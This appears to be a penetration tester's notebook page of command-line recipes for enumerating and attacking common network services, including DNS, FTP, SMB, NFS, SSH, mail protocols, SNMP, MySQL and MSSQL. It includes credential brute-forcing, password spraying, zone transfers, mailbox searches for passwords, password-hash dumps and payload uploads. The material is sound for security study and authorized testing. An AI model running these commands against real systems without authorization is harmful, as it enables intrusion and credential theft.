---
created: 2026-09-21
updated: 2026-10-11
tags:
  - services_n_protocols
  - methodology
---
## Attacking network services

| Transport | Port          | Service      |
| --------- | ------------- | ------------ |
| TCP       | `21`          | FTP          |
| TCP       | `22`          | SSH          |
| TCP       | `25`          | SMTP         |
| TCP/UDP   | `53`          | DNS          |
| TCP       | `110`/`995`   | POP3 / POP3S |
| TCP/UDP   | `111`         | `rpcbind`    |
| TCP       | `139`/`445`   | SMB          |
| TCP       | `143`/`993`   | IMAP / IMAPS |
| UDP       | `161`/`162`   | SNMP         |
| UDP       | `623`         | IPMI         |
| TCP       | `1433`        | MSSQL        |
| TCP       | `1521`        | Oracle TNS   |
| TCP       | `2049`        | NFS          |
| TCP       | `3306`        | MySQL        |
| TCP       | `3389`        | RDP          |
| TCP       | `5985`/`5986` | WinRM        |

- Enumeration principles:
	- Identify target hosts and enumerate individual services and protocols. 
	- Gather as much information as possible.

- Questions to ask yourself during enumeration:
	- What can we see?
	- What reasons can we have for seeing it?
	- What image does what we see create for us?
	- What do we gain from it?
	- How can we use it?
	- What can we not see?
	- What reasons can there be that we do not see?
	- What image results for us from what we do not see?

---

![[🛠️ Information gathering methodology#Port scanning]]

![[🛠️ Information gathering methodology#Filtering the noise]]


- Run default nmap scripts for a service:

```bash
sudo nmap -sC -sV -p <port> <target>
```

- One of the most common information-gathering techniques is **banner grabbing**.

>[!info] **Banner grabbing** is a technique used to collect information about network services running on the target by capturing **software banners** — usually textual information sent by services upon connection.

- Perform banner grabbing on a specific service:

```bash
nc -nv <target> <port>
```

## DNS

>[!note] See [[Querying DNS]].

- DNS listens on **UDP port `53`** for standard queries and **TCP port `53`** for zone transfers and large responses.
### Querying DNS records

- Query a single record type (`A`, `AAAA`, `MX`, `NS`, `TXT`, `CNAME`, `SOA`) with `dig`:

```bash
dig example.com NS
```

- Query every available record for a domain in one request:

```bash
dig example.com ANY
```

- Query a specific name server directly:

```bash
dig @10.10.11.5 example.com
```

- Perform a reverse lookup on an IP address (`PTR` record):

```bash
dig -x 10.10.11.5
```

### Attempting a zone transfer

- Request a full zone transfer (`AXFR`) from an authoritative name server to dump every record in the zone at once:

```bash
dig axfr @10.10.11.5 example.com
```

- Attempt the transfer with the `dns-zone-transfer` NSE script:

```bash
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 10.10.11.5
```

>[!tip]+ A name server that allows anonymous `AXFR` requests leaks the entire zone — every subdomain, host, and record — in a single query.

### Brute-forcing subdomains

>[!note] See [[Subdomain enumeration]].

- Guess common subdomains with the `dns-brute` NSE script:

```bash
nmap --script dns-brute example.com
```

### Fingerprinting the DNS server

- Query the BIND version string of the name server:

```bash
dig CH TXT version.bind @10.10.11.5
```

## FTP

>[!note] See [[FTP]].

### Enumerating FTP

- Perform service version detection on the default FTP port:

```bash
sudo nmap -sV -p 21 10.10.11.5
```

- Run default FTP NSE scripts:

```bash
sudo nmap -sV -sC -p 21 10.10.11.5
```

- Run all available FTP NSE scripts:

```bash
nmap -p 21 --script "ftp-*" 10.10.11.5
```

>[!note]- Common Nmap FTP scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`ftp-anon`](https://nmap.org/nsedoc/scripts/ftp-anon.html) | `default`, `auth`, `safe` | Check whether the FTP server allows anonymous logins. |
> | [`ftp-syst`](https://nmap.org/nsedoc/scripts/ftp-syst.html) | `default`, `safe`, `discovery` | Retrieve operating system and software information. |
> | [`ftp-bounce`](https://nmap.org/nsedoc/scripts/ftp-bounce.html) | `default`, `safe` | Test whether the server is vulnerable to FTP bounce attacks. |
> | [`ftp-brute`](https://nmap.org/nsedoc/scripts/ftp-brute.html) | `intrusive`, `brute` | Perform password brute-forcing against FTP accounts. |
> | [`ftp-libopie`](https://nmap.org/nsedoc/scripts/ftp-libopie.html) | `vuln`, `intrusive` | Test for the OPIE off-by-one stack overflow vulnerability (`CVE-2010-1938`). |
> | [`ftp-proftpd-backdoor`](https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html) | `exploit`, `intrusive`, `malware`, `vuln` | Test for the ProFTPD 1.3.3c backdoor command-execution flaw. |
> | [`ftp-vsftpd-backdoor`](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html) | `exploit`, `intrusive`, `malware`, `vuln` | Test for the vsFTPd 2.3.4 backdoor (`CVE-2011-2523`). |
> | [`tftp-enum`](https://nmap.org/nsedoc/scripts/tftp-enum.html) | `discovery`, `intrusive` | Enumerate TFTP filenames. |

>[!tip]+
> - List local Nmap scripts for FTP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*ftp*
> ```

- Grab the FTP service banner using Netcat:

```bash
nc -vn 10.10.11.5 21
```

- Query system information (`SYST` command):

```bash
echo "SYST" | nc -w 5 10.10.11.5 21
```

- Query server status information (`STAT` command):

```bash
echo "STAT" | nc -w 5 10.10.11.5 21
```

- Enumerate supported features and extensions (`FEAT` command):

```bash
echo "FEAT" | nc -w 5 10.10.11.5 21
```

>[!tip]+
> - Retrieve the TLS/SSL certificate from an FTPS server using explicit TLS:
> 
> ```bash
> openssl s_client -connect 10.10.11.5:21 -starttls ftp
> ```

### Testing for anonymous login

- Test for anonymous login using the standard interactive `ftp` client:

```bash
ftp 10.10.11.5
```

- Test for anonymous login using Netcat:

```bash
nc 10.10.11.5 21
```
```bash
# once the connection is established, authenticate using raw commands
USER anonymous
PASS anonymous
```

- Test for anonymous login using Nmap ([`ftp-anon`](https://nmap.org/nsedoc/scripts/ftp-anon.html)):

```bash
nmap --script ftp-anon -p 21 10.10.11.5
```

### Brute-forcing credentials

- Brute-force FTP usernames and passwords:

```bash
medusa -M ftp -h 10.10.11.5 -U usernames.txt -P /usr/share/wordlists/rockyou.txt -e ns
```

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.5
```

```bash
nmap -p 21 --script ftp-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

- Perform password spraying:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt -s 2121 10.10.11.5 ftp
```

### Interacting with FTP

>[!note] See [[FTP#Interacting with FTP servers]].

- Connect to an FTP server on a non-standard port:

```bash
ftp -P 2121 10.10.11.5
```

- Authenticate inline using a URL:

```bash
ftp ftp://jdoe:passwd123@10.10.11.5
```

- List files and directories within an interactive FTP session:

```bash
ftp> ls -al
```

- Download a specific remote file:

```bash
ftp> get file.txt
```

- Download all accessible files recursively:

```bash
ftp> mget *
```

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.11.5
```

- Upload a local file to the remote working directory:

```bash
put payload.exe
```

- Recursively mirror remote directories using `lftp`:

```bash
lftp -e 'set ftp:passive-mode true; mirror; quit' -u anonymous,anonymous 10.10.11.5
```

## SMB

>[!note] See [[SMB]].
### Enumerating SMB

- Perform service version detection on the default SMB ports:

```bash
sudo nmap -sV -p 139,445 10.10.11.5
```

- Run default SMB NSE scripts:

```bash
sudo nmap -sV -sC -p 139,445 10.10.11.5
```

- Run all available SMB NSE scripts:

```bash
nmap -p 139,445 --script "smb-*" 10.10.11.5
```

>[!note]- Common Nmap SMB scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`smb-os-discovery`](https://nmap.org/nsedoc/scripts/smb-os-discovery.html) | `default`, `discovery`, `safe` | Extract OS distribution, computer name, domain/workgroup, and system time. |
> | [`smb-enum-shares`](https://nmap.org/nsedoc/scripts/smb-enum-shares.html) | `discovery`, `intrusive` | Enumerate available SMB shares and test read/write permissions. |
> | [`smb-enum-users`](https://nmap.org/nsedoc/scripts/smb-enum-users.html) | `auth`, `intrusive` | Enumerate local and domain user accounts via SAMR and LSA interfaces. |
> | [`smb-enum-groups`](https://nmap.org/nsedoc/scripts/smb-enum-groups.html) | `discovery`, `intrusive` | Enumerate domain groups and their member accounts. |
> | [`smb-security-mode`](https://nmap.org/nsedoc/scripts/smb-security-mode.html) | `default`, `discovery`, `safe` | Identify the SMB security level and whether message signing is required. |
> | [`smb-protocols`](https://nmap.org/nsedoc/scripts/smb-protocols.html) | `default`, `discovery`, `safe` | Enumerate supported SMB protocol versions and dialects. |
> | [`smb-vuln-ms17-010`](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html) | `vuln`, `safe` | Check whether the remote host is vulnerable to EternalBlue (`MS17-010`). |
> | [`nbstat`](https://nmap.org/nsedoc/scripts/nbstat.html) | `default`, `discovery`, `safe` | Retrieve the NetBIOS name table and MAC address over UDP port `137`. |

>[!tip]+
> - List local Nmap scripts for SMB:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*smb*
> ```

- Query the NetBIOS name table to identify the hostname, domain or workgroup, and host role:

```bash
nbtscan 10.10.11.5
```

```bash
nmblookup -A 10.10.11.5
```

- Enumerate shares, permissions, and domain information using NetExec:

```bash
nxc smb 10.10.11.5 --shares
```

- Enumerate shares and check permissions using [`SMBMap`](https://github.com/shawndevans/smbmap):

```bash
smbmap -H 10.10.11.5
```

- Enumerate SMB and RPC automatically using [`enum4linux-ng`](https://github.com/cddmp/enum4linux-ng):

```bash
enum4linux-ng -A 10.10.11.5
```

### Testing for null sessions and guest access

- List shares anonymously using [`smbclient`](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html):

```bash
smbclient -L //10.10.11.5 -N
```

- Connect to a share anonymously via null session:

```bash
smbclient //10.10.11.5/public -N
```

- Check share permissions with null session credentials via `SMBMap`:

```bash
smbmap -H 10.10.11.5 -u '' -p ''
```

- Establish an unauthenticated RPC session:

```bash
rpcclient -U '%' 10.10.11.5
```

- Enumerate shares via Nmap null session probe:

```bash
nmap -p 445 --script smb-enum-shares 10.10.11.5
```

### Brute-forcing credentials

- Perform password spraying across a network subnet using NetExec:

```bash
nxc smb 10.10.11.0/24 -u usernames.txt -p 'passwd123' --no-bruteforce
```

- Brute-force local user credentials using NetExec:

```bash
nxc smb 10.10.11.5 -u usernames.txt -p /usr/share/wordlists/rockyou.txt --local-auth
```

- Brute-force SMB credentials using Hydra:

```bash
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt smb://10.10.11.5
```

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt smb://10.10.11.5
```

- Brute-force SMB credentials using Medusa:

```bash
medusa -M smb -h 10.10.11.5 -u jdoe -P /usr/share/wordlists/rockyou.txt -e ns
```

- Brute-force credentials using Nmap:

```bash
nmap -p 445 --script smb-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

### Interacting with SMB

>[!note] See [[SMB#Interacting with SMB shares]].

- Connect to an SMB share interactively with valid credentials:

```bash
smbclient //10.10.11.5/finance -U jdoe%passwd123
```

- Connect to a domain-authenticated SMB share:

```bash
smbclient //10.10.11.5/finance -U jdoe -W example.com
```

- Execute non-interactive commands against an SMB share:

```bash
smbclient //10.10.11.5/finance -U jdoe%passwd123 -c 'ls; get confidential.pdf'
```

- List accessible files recursively across a specific share with SMBMap:

```bash
smbmap -H 10.10.11.5 -u jdoe -p passwd123 -s finance -r
```

- Download a remote file using SMBMap:

```bash
smbmap -H 10.10.11.5 -u jdoe -p passwd123 -s finance --download 'finance\confidential.pdf'
```

- Upload a local file to a share using SMBMap:

```bash
smbmap -H 10.10.11.5 -u jdoe -p passwd123 -s finance --upload payload.exe 'finance\payload.exe'
```

- Mount an SMB share locally to the Linux filesystem:

```bash
sudo mount -t cifs //10.10.11.5/finance /mnt/smb -o username=jdoe,password=passwd123,domain=example.com
```

- Unmount a mounted SMB share:

```bash
sudo umount /mnt/smb
```



## NFS

>[!note] See [[NFS]].

### Enumerating NFS

- Perform service version detection on the default NFS ports:

```bash
sudo nmap -sV -p 111,2049 10.10.11.5
```

- Run default NFS NSE scripts:

```bash
sudo nmap -sV -sC -p 111,2049 10.10.11.5
```

- Run all available NFS NSE scripts:

```bash
nmap -p 111,2049 --script "nfs-*" 10.10.11.5
```

>[!note]- Common Nmap NFS scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`rpcinfo`](https://nmap.org/nsedoc/scripts/rpcinfo.html) | `default`, `discovery`, `safe`, `version` | Query the portmapper for all registered RPC programs, versions, and ports. |
> | [`nfs-showmount`](https://nmap.org/nsedoc/scripts/nfs-showmount.html) | `discovery`, `safe` | List exported shares and their access restrictions, similar to `showmount -e`. |
> | [`nfs-ls`](https://nmap.org/nsedoc/scripts/nfs-ls.html) | `discovery`, `safe` | List files and attributes within accessible NFS exports. |
> | [`nfs-statfs`](https://nmap.org/nsedoc/scripts/nfs-statfs.html) | `discovery`, `safe` | Retrieve filesystem statistics from a remote NFS share. |

>[!tip]+
> - List local Nmap scripts for NFS:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*nfs*
> ```

- Query the portmapper for all registered RPC services:

```bash
rpcinfo -p 10.10.11.5
```

- List exported shares and their client restrictions:

```bash
showmount -e 10.10.11.5
```

- Probe for the NFS service and enumerate shares using NetExec:

```bash
nxc nfs 10.10.11.5 --shares
```

### Interacting with NFS

>[!note] See [[NFS#Interacting with NFS]].

- Create a local mount point:

```bash
sudo mkdir -p /mnt/nfs
```

- Mount an exported share to the local filesystem:

```bash
sudo mount -t nfs 10.10.11.5:/share /mnt/nfs
```

- Mount a share, forcing a specific protocol version and disabling locking:

```bash
sudo mount -t nfs -o vers=3,nolock 10.10.11.5:/share /mnt/nfs
```

- List share contents without mounting using NetExec:

```bash
nxc nfs 10.10.11.5 --share '/share' --ls '/'
```

- Unmount the share once triage is complete:

```bash
sudo umount /mnt/nfs
```


## SSH

>[!note] See [[SSH]].

### Enumerating SSH

- Perform service version detection on the default SSH port:

```bash
sudo nmap -sV -p 22 10.10.11.5
```

- Run default SSH NSE scripts:

```bash
sudo nmap -sV -sC -p 22 10.10.11.5
```

- Run all available SSH NSE scripts:

```bash
nmap -p 22 --script "ssh-*" 10.10.11.5
```

>[!note]- Common Nmap SSH scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`ssh-auth-methods`](https://nmap.org/nsedoc/scripts/ssh-auth-methods.html) | `auth`, `intrusive` | Enumerate supported SSH authentication methods (e.g., password, public key) by initiating a partial login attempt. |
> | [`ssh2-enum-algos`](https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html) | `safe`, `discovery` | Enumerate supported SSHv2 algorithms (key exchange, encryption, MAC, compression). |
> | [`ssh-hostkey`](https://nmap.org/nsedoc/scripts/ssh-hostkey.html) | `safe`, `default`, `discovery` | Retrieve SSH host keys and fingerprints; compare against `known_hosts` for validation. |
> | [`ssh-publickey-acceptance`](https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html) | `auth`, `intrusive` | Test whether specific public/private key pairs are accepted for authentication. |
> | [`ssh-brute`](https://nmap.org/nsedoc/scripts/ssh-brute.html) | `auth`, `intrusive`, `brute` | Perform brute-force password guessing against SSH user accounts. |
> | [`ssh-run`](https://nmap.org/nsedoc/scripts/ssh-run.html) | `intrusive` | Execute arbitrary commands on the remote SSH server using provided credentials. |
> | [`sshv1`](https://nmap.org/nsedoc/scripts/sshv1.html) | `safe`, `discovery`, `vuln` | Detect whether the server supports the insecure and deprecated SSHv1 protocol. |

>[!tip]+
> - List local Nmap scripts for SSH:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*ssh*
> ```

- Grab the SSH service banner using Netcat:

```bash
nc -vn 10.10.11.5 22
```

- Enumerate supported authentication methods:

```bash
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=jdoe" 10.10.11.5
```

- Audit the SSH server's supported algorithms and configuration with [`ssh-audit`](https://github.com/jtesta/ssh-audit):

```bash
ssh-audit 10.10.11.5
```

### Brute-forcing credentials

- Brute-force SSH credentials using Medusa:

```bash
medusa -M ssh -h 10.10.11.5 -u jdoe -P /usr/share/wordlists/rockyou.txt -e ns
```

- Brute-force SSH credentials using Hydra:

```bash
hydra -l jdoe -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.5
```

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.5
```

- Brute-force SSH credentials using Nmap:

```bash
nmap -p 22 --script ssh-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

- Perform password spraying:

```bash
nxc ssh 10.10.11.0/24 -u usernames.txt -p /usr/share/wordlists/rockyou.txt --no-bruteforce
```

### Interacting with SSH

>[!note] See [[SSH#Interacting with SSH servers]].

- Connect to an SSH server with password authentication:

```bash
ssh jdoe@10.10.11.5
```

- Connect to an SSH server using an explicit private key:

```bash
ssh -i ~/.ssh/id_rsa jdoe@10.10.11.5
```

- Connect to an SSH server on a non-standard port:

```bash
ssh -p 2222 jdoe@10.10.11.5
```

- Execute a remote command non-interactively over SSH:

```bash
ssh jdoe@10.10.11.5 'whoami; id; uname -a'
```

- Transfer files securely using SCP:

```bash
scp jdoe@10.10.11.5:/path/to/remote/file /path/to/local/destination
```

```bash
scp /path/to/local/file jdoe@10.10.11.5:/path/to/remote/destination
```


## SMTP

>[!note] See [[SMTP]].

### Enumerating SMTP

- Perform service version detection on the default SMTP ports:

```bash
sudo nmap -sV -p 25,465,587 10.10.11.5
```

- Run default SMTP NSE scripts:

```bash
sudo nmap -sV -sC -p 25,465,587 10.10.11.5
```

- Run all available SMTP NSE scripts:

```bash
nmap -p 25,465,587 --script "smtp-*" 10.10.11.5
```

>[!note]- Common Nmap SMTP scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`smtp-commands`](https://nmap.org/nsedoc/scripts/smtp-commands.html) | `default`, `discovery`, `safe` | Issue `EHLO` and `HELP` to gather the extended commands supported by the server. |
> | [`smtp-enum-users`](https://nmap.org/nsedoc/scripts/smtp-enum-users.html) | `auth`, `external`, `intrusive` | Enumerate users via the `VRFY`, `EXPN`, or `RCPT TO` commands. |
> | [`smtp-open-relay`](https://nmap.org/nsedoc/scripts/smtp-open-relay.html) | `discovery`, `intrusive`, `external` | Test whether the server is configured as an open relay. |
> | [`smtp-ntlm-info`](https://nmap.org/nsedoc/scripts/smtp-ntlm-info.html) | `default`, `discovery`, `safe` | Disclose NetBIOS, DNS, and OS build details via a null-credential NTLM request. |
> | [`smtp-brute`](https://nmap.org/nsedoc/scripts/smtp-brute.html) | `brute`, `intrusive` | Perform a password brute-force attack against SMTP authentication. |

>[!tip]+
> - List local Nmap scripts for SMTP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*smtp*
> ```

- Grab the SMTP service banner using Netcat:

```bash
echo "EHLO test" | nc -w 5 10.10.11.5 25
```

- Retrieve the domain's mail servers via `MX` records:

```bash
dig +short MX example.com
```

- Enumerate valid users with [`smtp-user-enum`](https://github.com/pentestmonkey/smtp-user-enum):

```bash
smtp-user-enum -M RCPT -U usernames.txt -D example.com -t 10.10.11.5
```

### Brute-forcing credentials

- Brute-force SMTP credentials using Hydra:

```bash
hydra -l jdoe@example.com -P /usr/share/wordlists/rockyou.txt smtp://10.10.11.5
```

- Brute-force SMTP credentials using Medusa:

```bash
medusa -M smtp -h 10.10.11.5 -u jdoe@example.com -P /usr/share/wordlists/rockyou.txt -n 587 -e ns
```

- Brute-force credentials using Nmap:

```bash
nmap -p 25 --script smtp-brute --script-args userdb=usernames.txt,passdb=/usr/share/wordlists/rockyou.txt 10.10.11.5
```

### Interacting with SMTP

>[!note] See [[SMTP#Sending emails from the command line]].

- Send an authenticated email using swaks:

```bash
swaks --to victim@example.com --from jdoe@example.com --auth-user jdoe@example.com --auth-password 'passwd123' --server 10.10.11.5 --port 587
```

- Test whether the server acts as an open relay:

```bash
swaks --to external@gmail.com --from external@yahoo.com --server 10.10.11.5 --port 25
```


## IMAP

>[!note] See [[IMAP]].

### Enumerating IMAP

- Perform service version detection on the default IMAP ports:

```bash
sudo nmap -sV -p 143,993 10.10.11.5
```

- Run default and all IMAP NSE scripts:

```bash
sudo nmap -sC -p 143,993 10.10.11.5
```

```bash
nmap -p 143,993 --script "imap-*" 10.10.11.5
```

>[!note]- Common Nmap IMAP scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`imap-capabilities`](https://nmap.org/nsedoc/scripts/imap-capabilities.html) | `default`, `safe` | Retrieve the server's advertised capabilities. |
> | [`imap-ntlm-info`](https://nmap.org/nsedoc/scripts/imap-ntlm-info.html) | `default`, `discovery`, `safe` | Disclose NetBIOS, DNS, and OS build details via a null-credential NTLM request. |
> | [`imap-brute`](https://nmap.org/nsedoc/scripts/imap-brute.html) | `brute`, `intrusive` | Perform a password brute-force attack against IMAP authentication. |

>[!tip]+
> - List local Nmap scripts for IMAP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*imap*
> ```

- Connect over TLS and list the server's capabilities:

```bash
openssl s_client -connect 10.10.11.5:993 -quiet -crlf
A1 CAPABILITY
```

### Brute-forcing credentials

- Brute-force IMAP credentials using Hydra:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt imap://10.10.11.5
```

- Brute-force IMAP credentials using Medusa:

```bash
medusa -U usernames.txt -P /usr/share/wordlists/rockyou.txt -h 10.10.11.5 -M imap
```

- Brute-force credentials using Nmap:

```bash
nmap -p 143 --script imap-brute 10.10.11.5
```

### Interacting with IMAP

>[!note] See [[IMAP#Interacting with IMAP]].

- Log in and search a mailbox for sensitive content:

```bash
A1 LOGIN jdoe@example.com 'passwd123'
A2 SELECT INBOX
A3 SEARCH BODY "password"
```

- Retrieve a message body without marking it as read:

```bash
A4 FETCH 1 BODY.PEEK[1]
```

## POP3

>[!note] See [[POP3]].

### Enumerating POP3

- Perform service version detection on the default POP3 ports:

```bash
sudo nmap -sV -p 110,995 10.10.11.5
```

- Run default and all POP3 NSE scripts:

```bash
sudo nmap -sC -p 110,995 10.10.11.5
```

```bash
nmap -p 110,995 --script "pop3-*" 10.10.11.5
```

>[!note]- Common Nmap POP3 scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`pop3-capabilities`](https://nmap.org/nsedoc/scripts/pop3-capabilities.html) | `default`, `discovery`, `safe` | Retrieve the server's advertised capabilities. |
> | [`pop3-ntlm-info`](https://nmap.org/nsedoc/scripts/pop3-ntlm-info.html) | `default`, `discovery`, `safe` | Disclose NetBIOS, DNS, and OS build details via a null-credential NTLM request. |
> | [`pop3-brute`](https://nmap.org/nsedoc/scripts/pop3-brute.html) | `brute`, `intrusive` | Perform a password brute-force attack against POP3 authentication. |

>[!tip]+
> - List local Nmap scripts for POP3:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*pop3*
> ```

- Connect and list the server's capabilities:

```bash
nc -nv 10.10.11.5 110
CAPA
```

### Brute-forcing credentials

- Brute-force POP3 credentials using Hydra:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt pop3://10.10.11.5
```

- Brute-force POP3 credentials using Medusa:

```bash
medusa -U usernames.txt -P /usr/share/wordlists/rockyou.txt -h 10.10.11.5 -M pop3
```

- Brute-force credentials using Nmap:

```bash
nmap -p 110 --script pop3-brute 10.10.11.5
```

### Interacting with POP3

>[!note] See [[POP3#Interacting with POP3]].

- Log in and retrieve mail over TLS:

```bash
openssl s_client -connect 10.10.11.5:995 -quiet -crlf
USER jdoe
PASS passwd123
STAT
LIST
RETR 1
```

## SNMP

>[!note] See [[SNMP]].

### Enumerating SNMP

- Perform service version detection on the default SNMP port over UDP:

```bash
sudo nmap -sU -p 161 -sV 10.10.11.5
```

- Run all SNMP NSE scripts against the agent and trap ports:

```bash
sudo nmap -sU -p 161,162 --script "snmp-*" 10.10.11.5
```

>[!note]- Common Nmap SNMP scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`snmp-info`](https://nmap.org/nsedoc/scripts/snmp-info.html) | `default`, `discovery`, `safe` | Extract basic engine and vendor information from the target. |
> | [`snmp-sysdescr`](https://nmap.org/nsedoc/scripts/snmp-sysdescr.html) | `default`, `discovery`, `safe` | Retrieve the system description and uptime. |
> | [`snmp-brute`](https://nmap.org/nsedoc/scripts/snmp-brute.html) | `intrusive`, `brute` | Brute-force the community string against the target. |
> | [`snmp-processes`](https://nmap.org/nsedoc/scripts/snmp-processes.html) | `default`, `discovery`, `safe` | Enumerate running processes, including paths and arguments. |
> | [`snmp-win32-users`](https://nmap.org/nsedoc/scripts/snmp-win32-users.html) | `default`, `discovery`, `safe` | Enumerate Windows user accounts via the LanManager MIB. |

>[!tip]+
> - List local Nmap scripts for SNMP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*snmp*
> ```

- Confirm access with a default community string by reading the system branch:

```bash
snmpwalk -v2c -c public 10.10.11.5 1.3.6.1.2.1.1
```

### Brute-forcing community strings

- Brute-force community strings using `onesixtyone`:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.11.5
```

- Brute-force community strings using Hydra:

```bash
hydra -P /usr/share/wordlists/rockyou.txt -s 161 snmp://10.10.11.5
```

- Brute-force community strings using Nmap:

```bash
sudo nmap -sU -p 161 --script snmp-brute 10.10.11.5
```

### Interacting with SNMP

>[!note] See [[SNMP#Interacting with SNMP]].

- Dump the entire MIB with a known community string:

```bash
snmpwalk -v2c -c public 10.10.11.5
```

- Enumerate and format host information automatically:

```bash
snmp-check -v 2c -c public 10.10.11.5
```

## MySQL

>[!note] See [[MySQL]].

### Enumerating MySQL

- Perform service version detection on the default MySQL port:

```bash
sudo nmap -sV -p 3306 10.10.11.5
```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 3306 10.10.11.5
```

- Run all available MySQL NSE scripts:

```bash
sudo nmap -sV --script "mysql-*" -p 3306 10.10.11.5
```

>[!note]- Common Nmap MySQL scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`mysql-empty-password`](https://nmap.org/nsedoc/scripts/mysql-empty-password.html) | `intrusive`, `auth` | Check for empty passwords on the `root` and `anonymous` accounts. |
> | [`mysql-enum`](https://nmap.org/nsedoc/scripts/mysql-enum.html) | `intrusive`, `brute` | Enumerate valid users on the MySQL server. |
> | [`mysql-brute`](https://nmap.org/nsedoc/scripts/mysql-brute.html) | `intrusive`, `brute` | Perform a credential brute-force attack. |
> | [`mysql-databases`](https://nmap.org/nsedoc/scripts/mysql-databases.html) | `discovery`, `intrusive` | List all databases (requires valid credentials). |
> | [`mysql-dump-hashes`](https://nmap.org/nsedoc/scripts/mysql-dump-hashes.html) | `auth`, `discovery`, `safe` | Dump password hashes (requires `root`). |

>[!tip]+
> - List local Nmap scripts for MySQL:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*mysql*
> ```

- Check for empty `root` and `anonymous` passwords:

```bash
nmap -p 3306 --script mysql-empty-password 10.10.11.5
```

### Brute-forcing credentials

- Brute-force MySQL credentials using Hydra:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.11.5
```

- Brute-force credentials using Nmap:

```bash
nmap -p 3306 --script mysql-brute 10.10.11.5
```

### Interacting with MySQL

>[!note] See [[MySQL#Connecting to MySQL]].

- Connect with the `mysql` client:

```bash
mysql -h 10.10.11.5 -u root -p
```

- List databases and hunt for sensitive columns:

```bash
mysql -h 10.10.11.5 -u root -p -e "SHOW DATABASES; SELECT table_name, column_name FROM information_schema.COLUMNS WHERE column_name LIKE '%pass%';"
```

- Dump password hashes (requires `root`):

```bash
mysql -h 10.10.11.5 -u root -p -e "SELECT user, host, authentication_string FROM mysql.user;"
```

## MSSQL

>[!note] See [[MSSQL]].

### Enumerating MSSQL

- Perform service version detection on the default MSSQL port:

```bash
sudo nmap -sV -p 1433 10.10.11.5
```

- Run version detection together with the default NSE scripts:

```bash
sudo nmap -sV -sC -p 1433 10.10.11.5
```

- Run all available MSSQL NSE scripts:

```bash
sudo nmap -sV --script "ms-sql-*" -p 1433 10.10.11.5
```

>[!note]- Common Nmap MSSQL scripts
> 
> | Script | Categories | Description |
> | :--- | :--- | :--- |
> | [`ms-sql-info`](https://nmap.org/nsedoc/scripts/ms-sql-info.html) | `default`, `discovery`, `safe` | Extract the version, instance name, and named-pipe details of the server. |
> | [`ms-sql-ntlm-info`](https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html) | `default`, `discovery`, `safe` | Disclose NetBIOS, DNS, and OS build details via a null NTLM request. |
> | [`ms-sql-empty-password`](https://nmap.org/nsedoc/scripts/ms-sql-empty-password.html) | `auth`, `intrusive` | Check for accounts (such as `sa`) protected by an empty password. |
> | [`ms-sql-brute`](https://nmap.org/nsedoc/scripts/ms-sql-brute.html) | `brute`, `intrusive` | Perform a password brute-force attack against MSSQL logins. |
> | [`ms-sql-dump-hashes`](https://nmap.org/nsedoc/scripts/ms-sql-dump-hashes.html) | `auth`, `discovery`, `safe` | Dump login password hashes (requires `sysadmin`). |
> | [`ms-sql-xp-cmdshell`](https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html) | `auth`, `intrusive` | Run an operating-system command through `xp_cmdshell` (requires `sysadmin`). |

>[!tip]+
> - List local Nmap scripts for MSSQL:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*ms-sql*
> ```

- Resolve named instances to their TCP ports via the SQL Server Browser (UDP `1434`):

```bash
sudo nmap -sU -p 1434 --script ms-sql-info 10.10.11.5
```

- Check for logins protected by an empty password:

```bash
nmap -p 1433 --script ms-sql-empty-password 10.10.11.5
```

### Brute-forcing credentials

- Brute-force MSSQL credentials using Hydra:

```bash
hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt mssql://10.10.11.5
```

- Brute-force credentials using NetExec:

```bash
nxc mssql 10.10.11.5 -u usernames.txt -p /usr/share/wordlists/rockyou.txt --local-auth
```

